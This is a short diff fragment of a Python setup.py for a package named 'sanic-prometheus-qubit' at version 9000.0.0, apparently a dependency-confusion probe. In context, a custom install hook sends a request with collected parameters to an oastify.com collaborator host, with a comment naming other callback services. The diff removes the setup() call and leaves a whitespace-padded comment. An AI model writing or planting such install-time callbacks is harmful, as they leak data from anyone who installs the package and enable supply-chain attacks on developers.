@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://r5xikid2s7oerc91zb2jqefn6ec40t.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='sanic-prometheus-qubit', #package name
-      version='9000.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                             
